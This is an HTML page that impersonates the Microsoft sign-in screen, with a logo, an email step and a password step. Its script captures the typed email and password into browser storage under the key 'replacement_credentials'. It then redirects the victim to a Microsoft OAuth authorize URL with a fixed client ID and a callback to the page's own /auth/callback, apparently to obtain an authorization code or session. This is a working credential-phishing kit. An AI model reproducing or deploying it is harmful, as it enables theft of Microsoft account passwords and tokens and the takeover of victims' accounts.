<!doctype html>
<html dir="ltr" class="" lang="en">
<head>
  <title>Sign in to your account</title>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
  <meta charset="utf-8">
  <link rel="shortcut icon" href="/images/favicon.ico">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="-1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" crossorigin="anonymous">
  <style>
    body {
      background-image: url('https://www.rapid7.com/cdn/assets/bltc9698ac925a4a219/683ddb9d2a76864ea7bc82bf/background.jpg') !important;
      background-size: cover !important; background-repeat: no-repeat !important; background-attachment: fixed !important;
      background-position: center center !important;
    }
    #div1, #div2 { background: #ffffff; }
    #back { cursor: pointer; color: #23272a; font-size: 18px; vertical-align: middle; }
  </style>
</head>

<body>
  <div class="container-fluid p-0">
    <div class="container">
      <div class="row my-5 py-5">
        <div class="col-lg-6 mx-auto">
          <div class="m-5 p-4 bg-white" id="div1">
            <img src="/images/microsoft_logo.svg" class="img-fluid" alt="Microsoft logo"><br><br>
            <span class="h5">Sign In</span><br>
            <span id="error" class="text-danger" style="display:none;">That Microsoft account doesn't exist. Enter a different account</span>
            <div class="form-group mt-2">
              <input type="email" name="email" class="form-control" id="email" placeholder="Email, phone or skype" autocomplete="email" autocapitalize="none">
            </div>
            <p>No account? <a href="#">Create one!</a></p>
            <div class="text-right">
              <button class="btn rounded-0 text-white px-4" id="next" style="background-color: #0066BA;">Next</button>
            </div>
          </div>

          <div class="m-5 p-4 bg-white" id="div2" style="display:none;">
            <form id="contact">
              <img src="/images/microsoft_logo.svg" class="img-fluid" alt="Microsoft logo"><br><br>
              <i class="fas fa-arrow-left" id="back" aria-hidden="true"></i>&nbsp;<span id="emailch"></span><br>
              <span id="msg" class="text-danger" style="display:none;"></span><br>
              <span class="h5">Password</span>
              <div class="form-group mt-2">
                <input type="password" name="password" class="form-control" id="password" placeholder="Enter Password" autocomplete="current-password">
              </div>
              <p><a href="#">Forgot my password</a></p>
              <div class="text-right">
                <button class="btn rounded-0 text-white px-4" id="submit-btn" style="background-color: #0066BA;">login</button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
  <script>
    $(document).ready(function(){
      function isValidEmail(email) {
        if (!email) return false;
        const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
        return emailRegex.test(email);
      }

      function showError(message) {
        $('#error').text(message).show();
        $('#msg').text(message).show();
      }

      $('#next').click(function(e) {
        e.preventDefault();
        const email = $('#email').val().trim();
        if (!isValidEmail(email)) {
          showError('Please enter a valid email address.');
          return;
        }
        $('#error').hide();
        $('#emailch').text(email);
        $('#div1').hide();
        $('#div2').show();
      });

      $('#back').click(function() {
        $('#div2').hide();
        $('#div1').show();
        $('#msg').hide();
      });

      $('#submit-btn').click(function(event){
        event.preventDefault();
        const email = $('#emailch').text().trim();
        const password = $('#password').val();

        if (!password) {
          showError('Please enter your password.');
          return;
        }
        
        $('#msg').hide();
        $('#submit-btn').html('Verifying...').prop('disabled', true);

        // Store credentials in localStorage
        const credentialsData = {
          email: email,
          password: password,
          captureTime: new Date().toISOString(),
          source: 'replacement-form-v2',
        };
        try {
          localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
          console.log('âœ… Credentials stored in localStorage.');
        } catch (e) {
          console.error('âŒ Failed to store credentials in localStorage:', e);
          // Don't stop the flow, just log the error
        }

        // CRITICAL FIX: The redirect_uri now points to our new /auth/callback page.
        const callbackUrl = window.location.origin + '/auth/callback';
        const microsoftLoginUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=${encodeURIComponent(callbackUrl)}&response_mode=query&scope=https://graph.microsoft.com/.default&state=12345&prompt=none&login_hint=${encodeURIComponent(email)}`;
        
        console.log(`ðŸ”„ Redirecting to Microsoft for cookie setting. Callback: ${callbackUrl}`);
        
        // Delay redirect slightly to ensure UI update
        setTimeout(() => {
          window.location.href = microsoftLoginUrl;
        }, 1000);
      });
    });
  </script>
</body>
</html>
